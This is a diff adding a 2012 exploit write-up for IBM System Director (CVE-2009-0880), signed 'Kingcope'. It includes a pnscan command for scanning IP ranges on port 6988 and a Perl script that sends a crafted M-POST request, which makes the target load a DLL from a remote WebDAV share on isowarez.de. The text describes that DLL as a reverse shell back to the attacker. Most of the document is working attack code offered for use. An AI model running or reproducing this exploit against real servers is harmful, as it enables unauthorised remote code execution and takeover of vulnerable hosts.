@@ -1,0 +1,75 @@
+IBM System Director Remote System Level Exploit (CVE-2009-0880 extended zeroday)
+Copyright (C) 2012 Kingcope
+
+IBM System Director has the port 6988 open. By using a special request
+to a vulnerable server,
+the attacker can force to load a dll remotely from a WebDAV share.
+
+The following exploit will load the dll from
+\\isowarez.de\\director\wootwoot.dll
+the wootwoot.dll is a reverse shell that will send a shell back to the
+attacker (the code has to be inside the dll initialization routine).
+The IBM Director exploit works on versions 5.20.3 and before, but not
+on 5.2.30 SP2 and above.
+Reference: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2009-0880
+There was a prior CVE for it, the CVE states the attack can load local
+files only, using the WebDAV server remote file can be loaded too.
+To scan for this software you can enter the following (by using pnscan):
+./pnscan -w"M-POST /CIMListener/ HTTP/1.1\r\nHost:
+localhost\r\nContent-Length: 0\r\n\r\n" -r HTTP <ipblock> 6988
+
+Exploit:
+---snip---
+use IO::Socket;
+#1st argument: target host
+my $sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                                 PeerPort => "6988",
+                                 Proto    => 'tcp');
+$payload =
+qq{<?xml version="1.0" encoding="utf-8" ?>
+<CIM CIMVERSION="2.0" DTDVERSION="2.0">
+ <MESSAGE ID="1007" PROTOCOLVERSION="1.0">
+  <SIMPLEEXPREQ>
+    <EXPMETHODCALL NAME="ExportIndication">
+     <EXPPARAMVALUE NAME="NewIndication">
+      <INSTANCE CLASSNAME="CIM_AlertIndication" >
+        <PROPERTY NAME="Description" TYPE="string">
+          <VALUE>Sample CIM_AlertIndication indication</VALUE>
+        </PROPERTY>
+        <PROPERTY NAME="AlertType" TYPE="uint16">
+          <VALUE>1</VALUE>
+        </PROPERTY>
+        <PROPERTY NAME="PerceivedSeverity" TYPE="uint16">
+          <VALUE>3</VALUE>
+        </PROPERTY>
+        <PROPERTY NAME="ProbableCause" TYPE="uint16">
+          <VALUE>2</VALUE>
+        </PROPERTY>
+        <PROPERTY NAME="IndicationTime" TYPE="datetime">
+          <VALUE>20010515104354.000000:000</VALUE>
+        </PROPERTY>
+      </INSTANCE>
+    </EXPPARAMVALUE>
+  </EXPMETHODCALL>
+ </SIMPLEEXPREQ>
+ </MESSAGE>
+</CIM>};
+$req =
+"M-POST /CIMListener/\\\\isowarez.de\\director\\wootwoot HTTP/1.1\r\n"
+."Host: $ARGV[0]\r\n"
+."Content-Type: application/xml; charset=utf-8\r\n"
+."Content-Length: ". length($payload) ."\r\n"
+."Man: http://www.dmtf.org/cim/mapping/http/v1.0 ; ns=40\r\n"
+."CIMOperation: MethodCall\r\n"
+."CIMExport: MethodRequest\r\n"
+."CIMExportMethod: ExportIndication\r\n\r\n";
+print $sock $req . $payload;
+
+while(<$sock>) {
+	print;
+}
+---snip---
+
+Cheerio,
+
+Kingcope
